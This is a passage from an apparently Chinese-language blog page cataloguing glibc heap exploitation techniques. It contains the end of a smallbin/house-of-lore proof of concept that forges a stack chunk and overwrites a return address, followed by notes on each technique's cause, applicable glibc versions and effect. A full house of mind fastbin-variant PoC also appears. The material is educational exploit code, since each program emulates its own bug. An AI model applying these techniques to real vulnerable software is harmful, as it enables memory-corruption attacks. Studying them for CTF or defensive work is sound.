<span class="number">0</span>;</span><br><span class="line">  stack_buffer_1[<span class="number">2</span>] = victim_chunk;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span></span><br><span class="line">         <span class="string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span></span><br><span class="line">         <span class="string">&quot;chunk on stack&quot;</span>);</span><br><span class="line">  stack_buffer_1[<span class="number">3</span>] = (<span class="type">intptr_t</span>*)stack_buffer_2;</span><br><span class="line">  stack_buffer_2[<span class="number">2</span>] = (<span class="type">intptr_t</span>*)stack_buffer_1;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;</span></span><br><span class="line">          <span class="string">&quot;introduced by smallbin-to-tcache mechanism\n&quot;</span>);</span><br><span class="line">  stack_buffer_2[<span class="number">3</span>] = (<span class="type">intptr_t</span> *)fake_freelist[<span class="number">0</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span></span><br><span class="line">         <span class="string">&quot;the small one during the free()\n&quot;</span>);</span><br><span class="line">  <span class="type">void</span> *p5 = <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing dummy chunk\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">free</span>(dummies[i]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now take all dummies chunk in tcache out\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = malloc(0x100)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="漏洞成因-6"><a href="#漏洞成因-6" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code>、<code>edit after free</code></p>
<h3 id="适用范围-6"><a href="#适用范围-6" class="headerlink" title="适用范围"></a>适用范围</h3><ul>
<li><code>2.23</code>—— 至今</li>
<li>需要泄露或已知地址</li>
</ul>
<h3 id="利用原理-6"><a href="#利用原理-6" class="headerlink" title="利用原理"></a>利用原理</h3><p>控制 <code>smallbin</code> 的 <code>bk</code> 指针，示例如下：</p>
<ul>
<li>申请 <code>chunk A、chunk B、chunk C</code>，其中 <code>chunk B</code> 大小位于 <code>smallbin</code></li>
<li>释放 <code>B</code>，申请更大的 <code>chunk D</code>，使得 <code>B</code> 进入 <code>smallbin</code></li>
<li>写 <code>A</code>，溢出修改 <code>B</code> 的 <code>bk</code>，指向地址 <code>X</code>，这里有 <code>fake chunk</code></li>
<li>布置 <code>X-&gt;fd == &amp;B</code></li>
<li>分配两次后即可取出位于 <code>X</code> 地址处的 <code>fake chunk</code></li>
</ul>
<h3 id="相关技巧-6"><a href="#相关技巧-6" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>在引入了 <code>tcache stash unlink</code> 的时候，需要注意绕过：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>要么使其满足 <code>tc_victim = last (bin)) == bin</code>、要么使其满足：<code>tcache-&gt;counts[tc_idx] ≥ mp_.tcache_count</code>。否则可能会因为非法内存访问使得程序 <code>down</code> 掉。</p>
<p>实际上，这个技巧用得不是很多，因为在同等条件下，更偏向于利用 <code>fastbin/tcachebin</code>。</p>
<h3 id="利用效果-6"><a href="#利用效果-6" class="headerlink" title="利用效果"></a>利用效果</h3><ul>
<li>任意地址分配</li>
<li>任意地址读写</li>
</ul>
<h2 id="house-of-mind"><a href="#house-of-mind" class="headerlink" title="house of mind"></a>house of mind</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">House of Mind - Fastbin Variant</span></span><br><span class="line"><span class="comment">==========================</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This attack is similar to the original &#x27;House of Mind&#x27; in that it uses</span></span><br><span class="line"><span class="comment">a fake non-main arena in order to write to a new location. This</span></span><br><span class="line"><span class="comment">uses the fastbin for a WRITE-WHERE primitive in the &#x27;fastbin&#x27;</span></span><br><span class="line"><span class="comment">variant of the original attack though. The original write for this</span></span><br><span class="line"><span class="comment">can be found at https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt with a more recent post (by me) at https://maxwelldulin.com/BlogPost?post=2257705984. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">By being able to allocate an arbitrary amount of chunks, a single byte</span></span><br><span class="line"><span class="comment">overwrite on a chunk size and a memory leak, we can control a super</span></span><br><span class="line"><span class="comment">powerful primitive. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This could be used in order to write a freed pointer to an arbitrary</span></span><br><span class="line"><span class="comment">location (which seems more useful). Or, this could be used as a</span></span><br><span class="line"><span class="comment">write-large-value-WHERE primitive (similar to unsortedbin attack). </span></span><br><span class="line"><span class="comment"> Both are interesting in their own right though but the first</span></span><br><span class="line"><span class="comment">option is the most powerful primitive, given the right setting.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Malloc chunks have a specified size and this size information</span></span><br><span class="line"><span class="comment">special metadata properties (prev_inuse, mmap chunk and non-main arena). </span></span><br><span class="line"><span class="comment">The usage of non-main arenas is the focus of this exploit. For more information </span></span><br><span class="line"><span class="comment">on this, read https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">First, we need to understand HOW the non-main arena is known from a chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This the &#x27;heap_info&#x27; struct: </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">struct _heap_info</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">  mstate ar_ptr;           // Arena for this heap. &lt;--- Malloc State pointer</span></span><br><span class="line"><span class="comment">  struct _heap_info *prev; // Previous heap.</span></span><br><span class="line"><span class="comment">  size_t size;            // Current size in bytes.</span></span><br><span class="line"><span class="comment">  size_t mprotect_size;   // Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">  char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK]; // Proper alignment</span></span><br><span class="line"><span class="comment">&#125; heap_info; </span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L48</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The important thing to note is that the &#x27;malloc_state&#x27; within</span></span><br><span class="line"><span class="comment">an arena is grabbed from the ar_ptr, which is the FIRST entry </span></span><br><span class="line"><span class="comment">of this. Malloc_state == mstate == arena </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The main arena has a special pointer. However, non-main arenas (mstate)</span></span><br><span class="line"><span class="comment">are at the beginning of a heap section. They are grabbed with the </span></span><br><span class="line"><span class="comment">following code below, where the user controls the &#x27;ptr&#x27; in &#x27;arena_for_chunk&#x27;:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">#define heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="comment">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br><span class="line"><span class="comment">#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">  (chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L127</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This macro takes the &#x27;ptr&#x27; and subtracts a large value because the </span></span><br><span class="line"><span class="comment">&#x27;heap_info&#x27; should be at the beginning of this heap section. Then, </span></span><br><span class="line"><span class="comment">using this, it can find the &#x27;arena&#x27; to use. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The idea behind the attack is to use a fake arena to write pointers </span></span><br><span class="line"><span class="comment">to locations where they should not go but abusing the &#x27;arena_for_chunk&#x27; </span></span><br><span class="line"><span class="comment">functionality when freeing a fastbin chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This POC does the following things: </span></span><br><span class="line"><span class="comment">- Finds a valid arena location for a non-main arena.</span></span><br><span class="line"><span class="comment">- Allocates enough heap chunks to get to the non-main arena location where </span></span><br><span class="line"><span class="comment">  we can control the values of the arena data. </span></span><br><span class="line"><span class="comment">- Creates a fake &#x27;heap_info&#x27; in order to specify the &#x27;ar_ptr&#x27; to be used as the arena later.</span></span><br><span class="line"><span class="comment">- Using this fake arena (ar_ptr), we can use the fastbin to write</span></span><br><span class="line"><span class="comment">  to an unexpected location of the &#x27;ar_ptr&#x27; with a heap pointer. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requirements: </span></span><br><span class="line"><span class="comment">- A heap leak in order to know where the fake &#x27;heap_info&#x27; is located at.</span></span><br><span class="line"><span class="comment">	- Could be possible to avoid with special spraying techniques</span></span><br><span class="line"><span class="comment">- An unlimited amount of allocations</span></span><br><span class="line"><span class="comment">- A single byte overflow on the size of a chunk</span></span><br><span class="line"><span class="comment">	- NEEDS to be possible to put into the fastbin. </span></span><br><span class="line"><span class="comment">	- So, either NO tcache or the tcache needs to be filled. </span></span><br><span class="line"><span class="comment">- The location of the malloc state(ar_ptr) needs to have a value larger</span></span><br><span class="line"><span class="comment">  than the fastbin size being freed at malloc_state.system_mem otherwise</span></span><br><span class="line"><span class="comment">  the chunk will be assumed to be invalid.</span></span><br><span class="line"><span class="comment">	- This can be manually inserted or CAREFULLY done by lining up</span></span><br><span class="line"><span class="comment">	  values in a proper way. </span></span><br><span class="line"><span class="comment">- The NEXT chunk, from the one that is being freed, must be a valid size</span></span><br><span class="line"><span class="comment">(again, greater than 0x20 and less than malloc_state.system_mem)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Random perks:</span></span><br><span class="line"><span class="comment">- Can be done MULTIPLE times at the location, with different sized fastbin</span></span><br><span class="line"><span class="comment">  chunks. </span></span><br><span class="line"><span class="comment">- Does not brick malloc, unlike the unsorted bin attack. </span></span><br><span class="line"><span class="comment">- Only has three requirements: Infinite allocations, single byte buffer overflowand a heap memory leak. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">Written up by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">************************************</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;House of Mind - Fastbin Variant\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;==================================&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The goal of this technique is to create a fake arena\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;at an offset of HEAP_MAX_SIZE\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Then, we write to the fastbins when the chunk is freed\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This creates a somewhat constrained WRITE-WHERE primitive\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Values for the allocation information.	</span></span><br><span class="line">	<span class="type">int</span> HEAP_MAX_SIZE = <span class="number">0x4000000</span>;</span><br><span class="line">	<span class="type">int</span> MAX_SIZE = (<span class="number">128</span>*<span class="number">1024</span>) - <span class="number">0x100</span>; <span class="comment">// MMap threshold: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L635</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Find initial location of the heap\n&quot;</span>);</span><br><span class="line">	<span class="comment">// The target location of our attack and the fake arena to use</span></span><br><span class="line">	<span class="type">uint8_t</span>* fake_arena = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); </span><br><span class="line">	<span class="type">uint8_t</span>* target_loc = fake_arena + <span class="number">0x30</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint8_t</span>* target_chunk = (<span class="type">uint8_t</span>*) fake_arena - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Prepare a valid &#x27;malloc_state&#x27; (arena) &#x27;system_mem&#x27; </span></span><br><span class="line"><span class="comment">	to store a fastbin. This is important because the size</span></span><br><span class="line"><span class="comment">	of a chunk is validated for being too small or too large</span></span><br><span class="line"><span class="comment">	via the &#x27;system_mem&#x27; of the &#x27;malloc_state&#x27;. This just needs</span></span><br><span class="line"><span class="comment">	to be a value larger than our fastbin chunk.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set &#x27;system_mem&#x27; (offset 0x888) for fake arena\n&quot;</span>);</span><br><span class="line">	fake_arena[<span class="number">0x888</span>] = <span class="number">0xFF</span>;</span><br><span class="line">	fake_arena[<span class="number">0x889</span>] = <span class="number">0xFF</span>; </span><br><span class="line">	fake_arena[<span class="number">0x88a</span>] = <span class="number">0xFF</span>; </span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Memory Address for overwrite: %p\n&quot;</span>, target_loc);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Must set data at HEAP_MAX_SIZE (0x%x) offset\n&quot;</span>, HEAP_MAX_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Calculate the location of our fake arena</span></span><br><span class="line">	<span class="type">uint64_t</span> new_arena_value = (((<span class="type">uint64_t</span>) target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fake_heap_info = (<span class="type">uint64_t</span>*) new_arena_value;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span>* user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake Heap Info struct location: %p\n&quot;</span>, fake_heap_info);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Allocate until we reach a MAX_HEAP_SIZE offset\n&quot;</span>);	</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	The fake arena must be at a particular offset on the heap.</span></span><br><span class="line"><span class="comment">	So, we allocate a bunch of chunks until our next chunk</span></span><br><span class="line"><span class="comment">	will be in the arena. This value was calculated above.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">while</span>((<span class="type">long</span> <span class="type">long</span>)user_mem &lt; new_arena_value)&#123;</span><br><span class="line">		user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Use this later to trigger craziness</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Create fastbin sized chunk to be victim of attack\n&quot;</span>);</span><br><span class="line">	<span class="type">uint64_t</span>* fastbin_chunk = <span class="built_in">malloc</span>(<span class="number">0x50</span>); <span class="comment">// Size of 0x60</span></span><br><span class="line">	<span class="type">uint64_t</span>* chunk_ptr = fastbin_chunk - <span class="number">2</span>; <span class="comment">// Point to chunk instead of mem</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fastbin Chunk to overwrite: %p\n&quot;</span>, fastbin_chunk);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fill up the TCache so that the fastbin will be used\n&quot;</span>);</span><br><span class="line">	<span class="comment">// Fill the tcache to make the fastbin to be used later. </span></span><br><span class="line">	<span class="type">uint64_t</span>* tcache_chunks[<span class="number">7</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)&#123;</span><br><span class="line">		tcache_chunks[i] = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)&#123;</span><br><span class="line">		<span class="built_in">free</span>(tcache_chunks[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Create a FAKE malloc_state pointer for the heap_state</span></span><br><span class="line"><span class="comment">	This is the &#x27;ar_ptr&#x27; of the &#x27;heap_info&#x27; struct shown above. </span></span><br><span class="line"><span class="comment">	This is the first entry in the &#x27;heap_info&#x27; struct at offset 0x0</span></span><br><span class="line"><span class="comment">	 at the heap.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	We set this to the location where we want to write a value to.</span></span><br><span class="line"><span class="comment">	The location that gets written to depends on the fastbin chunk</span></span><br><span class="line"><span class="comment">	size being freed. This will be between an offset of 0x8 and 0x40</span></span><br><span class="line"><span class="comment">	bytes. For instance, a chunk with a size of 0x20 would be in the</span></span><br><span class="line"><span class="comment">	0th index of fastbinsY struct. When this is written to, we will</span></span><br><span class="line"><span class="comment">	write to an offset of 8 from the original value written.</span></span><br><span class="line"><span class="comment">	- https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1686</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Setting &#x27;ar_ptr&#x27; (our fake arena)  in heap_info struct to %p\n&quot;</span>, fake_arena);</span><br><span class="line">	fake_heap_info[<span class="number">0</span>] = (<span class="type">uint64_t</span>) fake_arena; <span class="comment">// Setting the fake ar_ptr (arena)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p prior to exploitation: 0x%x\n&quot;</span>, target_loc, *(target_loc));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Set the non-main arena bit on the size. </span></span><br><span class="line"><span class="comment">	Additionally, we keep the size the same as the original</span></span><br><span class="line"><span class="comment">	allocation because there is a sanity check on the fastbin (when freeing)</span></span><br><span class="line"><span class="comment">	that the next chunk has a valid size. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	When grabbing the non-main arena, it will use our choosen arena!</span></span><br><span class="line"><span class="comment">	From there, it will write to the fastbin because of the size of the</span></span><br><span class="line"><span class="comment">	chunk.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	///// Vulnerability! Overwriting the chunk size </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Set non-main arena bit on the fastbin chunk\n&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;NOTE: This keeps the next chunk size valid because the actual chunk size was never changed\n&quot;</span>);</span><br><span class="line">	chunk_ptr[<span class="number">1</span>] = <span class="number">0x60</span> | <span class="number">0x4</span>; <span class="comment">// Setting the non-main arena bit</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//// End vulnerability </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The offset being written to with the fastbin chunk address</span></span><br><span class="line"><span class="comment">	depends on the fastbin BEING used and the malloc_state itself. </span></span><br><span class="line"><span class="comment">	In 2.31, the offset from the beginning of the malloc_state</span></span><br><span class="line"><span class="comment">	to the fastbinsY array is 0x10. Then, fastbinsY[0x4] is an </span></span><br><span class="line"><span class="comment">	additional byte offset of 0x20. In total, the writing offset</span></span><br><span class="line"><span class="comment">	from the arena location is 0x30 bytes.</span></span><br><span class="line"><span class="comment">	from the arena location to where the write actually occurs. </span></span><br><span class="line"><span class="comment">	This is a similar concept to bk - 0x10 from the unsorted</span></span><br><span class="line"><span class="comment">	bin attack. </span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;When we free the fastbin chunk with the non-main arena bit\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;set, it will cause our fake &#x27;heap_info&#x27; struct to be used.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;This will dereference our fake arena location and write\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;the address of the heap to an offset of the arena pointer.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Trigger the magic by freeing the chunk!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(fastbin_chunk); <span class="comment">// Trigger the madness</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// For this particular fastbin chunk size, the offset is 0x28. </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Target Write at %p: 0x%llx\n&quot;</span>, target_loc, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*) (target_loc)));</span><br><span class="line">	assert(*((<span class="type">unsigned</span> <span class="type">long</span> *) (target_loc)) != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="漏洞成因-7"><a href="#漏洞成因-7" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p>
